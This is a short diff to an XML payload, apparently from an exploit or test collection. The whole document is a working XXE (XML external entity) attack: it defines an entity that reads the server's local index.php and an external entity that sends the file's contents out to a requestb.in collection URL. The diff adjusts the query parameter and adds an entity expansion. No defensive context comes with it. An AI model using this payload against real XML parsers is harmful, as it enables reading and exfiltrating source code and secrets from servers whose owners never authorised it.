@@ -2,6 +2,7 @@
 <!DOCTYPE r [
 <!ELEMENT r ANY >
 <!ENTITY % data SYSTEM "file:///./index.php">
-<!ENTITY exfil SYSTEM "http://requestb.in/1ayyz3l1?%data;">
+<!ENTITY exfil SYSTEM "http://requestb.in/1ayyz3l1?d=%data;">
+%data;
 ]>
 <r>&exfil;</r>
